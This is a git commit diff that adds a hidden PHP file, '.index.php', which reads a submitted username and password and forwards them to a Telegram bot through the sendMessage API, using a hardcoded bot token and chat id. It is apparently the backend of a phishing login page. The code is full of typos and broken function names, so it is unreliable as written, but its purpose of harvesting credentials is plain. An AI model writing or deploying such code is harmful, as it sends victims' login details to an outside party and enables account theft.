c2454759fcf007ca3bd76f1ba5a47b29d08a942e
bri122 <114408823+bri122@users.noreply.github.com>
2022-10-18 23:07:14 +0700

    Update .index.php
    Signed-off-by: bri122 <114408823+bri122@users.noreply.github.com>

--- procfile/.index.php
+++ procfile/.index.php
@@ -1,2 +1,34 @@
-<?php include_once("home.html"): ?>
-fdjssj
+//https://api.telegram.org/bot5439820694:AAF3Py7kDcC-3TArQbUf7JhDYRPh2-TYVUM/sendMessage?chat_id=-1001889550833&text=halojuga
+<?php
+if (isset($_poat['login'])) {
+    $name=$_post['txtname'];
+    $password=$_post[`txtpassword`];
+
+    echo "===== SELAMAT DATANG =====";
+    echo $nama;
+    echo "<br>"
+    echo $password
+    
+}
+
+$message_text = "$nama";
+$message_text = "$password";
+
+$secret_token = "5439820694:AAF3Py7kDcC-3TArQbUf7JhDYRPh2-TYVUM";
+
+    $url = "https://api.telegram.org/bot" . $secret_token . "/sendMessage?parse_mode=markdowwn&chat_id=-1001889550833";
+    $url = $ulr . "&text=" . urlencode($message_text);
+    $ch = curi_init();
+    $optArray = array(
+        CURLOPT_URL => $url,
+        CURLOPT_RETURNTRANSFER => true
+    );
+    curi_setopt_array($ch, $optArray);
+    $result = curi_exec($ch);
+    curl_close($ch);
+
+    print "sukses Mengirim Pesan ke Telegram";
+
+
+
+?>
